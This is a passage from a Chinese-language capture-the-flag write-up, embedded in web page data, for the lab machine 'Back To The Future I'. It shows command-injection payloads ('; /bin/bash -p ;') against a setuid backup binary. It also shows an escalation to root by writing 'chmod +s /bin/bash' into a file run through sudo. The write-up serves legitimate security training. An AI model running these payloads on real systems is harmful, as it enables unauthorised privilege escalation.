class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( argc != 2 )\n    usage(argc, argv, envp);\n  v5 = argv[1];\n  snprintf(s, 0x100uLL, \u003cspan class=\"hljs-string\"\u003e\"tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs\"\u003c/span\u003e, v5);\n  setuid(0x3E8u);\n  system(s);\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中的 \u003ccode\u003esetuid(0x3E8u);\u003c/code\u003e 也就是 \u003ccode\u003e1000\u003c/code\u003e ，而 \u003ccode\u003e1000\u003c/code\u003e 刚好是 \u003ccode\u003edocbrown\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e并且执行的命令是 \u003ccode\u003etar czf /tmp/%s-backup.tar.gz /home/docbrown/docs\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e该程序存在命令注入，因为 \u003ccode\u003ev5\u003c/code\u003e 并没有被处理，而是直接被调用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-string\"\u003e\"; id ;\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emarty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner \u003cspan class=\"hljs-string\"\u003e\"; id ;\"\u003c/span\u003e\ntar: Cowardly refusing to create an empty archive\nTry \u003cspan class=\"hljs-string\"\u003e'tar --help'\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e'tar --usage'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more information.\nuid=1000(docbrown) gid=1001(marty) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1001(marty)\nsh: 1: -backup.tar.gz: not found\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得 \u003ccode\u003edocbrown\u003c/code\u003e 的 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emarty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner \u003cspan class=\"hljs-string\"\u003e\"; /bin/bash -p ;\"\u003c/span\u003e\ntar: Cowardly refusing to create an empty archive\nTry \u003cspan class=\"hljs-string\"\u003e'tar --help'\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e'tar --usage'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more information.\ndocbrown@hillvalley:/home/docbrown$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eTo Root\u003c/h2\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edocbrown@hillvalley:/home/docbrown$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e docbrown on hillvaley:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser docbrown may run the following commands on hillvaley:\n    (root) NOPASSWD: /usr/local/bin/time_daemon\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们尝试运行一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[FLUX] No existe el archivo /tmp/sync: No such file or directory\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edocbrown@hillvalley:/tmp$ vim \u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e\ndocbrown@hillvalley:/tmp$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e time_daemon\n[88MPH] Sincronización completada. Listo para viajar.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e貌似是创建定时任务\u003c/p\u003e\n\u003cp\u003e我们将提权语句写入 \u003ccode\u003e/tmp/sync\u003c/code\u003e 并运行 \u003ccode\u003etime_deamon\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edocbrown@hillvalley:/tmp$ \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"chmod +s /bin/bash\"\u003c/span\u003e \u003e /tmp/sync\n\ndocbrown@hillvalley:/usr/local/bin$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/local/bin/time_daemon\n[88MPH] Sincronización completada. Listo para viajar.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e等在 \u003ccode\u003epspy\u003c/code\u003e 显示运行计划任务，再查看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edocbrown@hillvalley:/usr/local/bin$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /bin/bash\n-rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebash-5.2# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e notes.txt \n¡Felicidades, viajero del tiempo!\n\nLograste lo imposible: viajaste al pasado, burlaste sistemas protegidos, superaste obstáculos temporales y... \n¡volviste al futuro con todos los flags en el DeLorean!\n\nDoc estaría orgulloso, y Marty… bueno, seguro todavía está en problemas con Biff. \nPero vos… vos demostraste que no hay sistema que se te resista ni timeline que no puedas manipular.\n\n    “El futuro no está escrito, todavía. El tuyo será exactamente como lo hagas.”\n    — Doc Emmett Brown\n\nGracias por jugar este CTF inspirado en una de las mejores trilogías de todos los tiempos. \n\nSi disfrutaste el viaje, no olvides compartir tus hallazgos con otros hackers del tiempo y prepararte para los \u003cspan class=\"hljs-built_in\"\u003epr\u003c/span\u003eóximos desafíos que se vienen en la saga.\n\nbash-5.2# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \nFLAGxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e难度还好，就是有些地方会卡住\u003c/p\u003e","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","updated":"2025-07-26","tags":["TheHackersLabs","Linux","SQLinjection","FileInclude","CommandInjection"],"categories":"靶机","comments":true,"description":"Back To The Future I\n\n https://labs.thehackerslabs.com/machine/119\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举\n\n`FTP` 匿名\n\n\n\n`HTTP` 服务\n\n\n\n查看源码能找到\n\n\n\n目录爆破\n\n\n\n`about.php`\n\n\n\n`logs.php`\n\n\n\n`time_machine.php`\n\n ？EI Psy K..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"TheHackersLabsBack To The Future I"},"buildId":"BhT_uiZI9tLUHe-4nDcBE","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>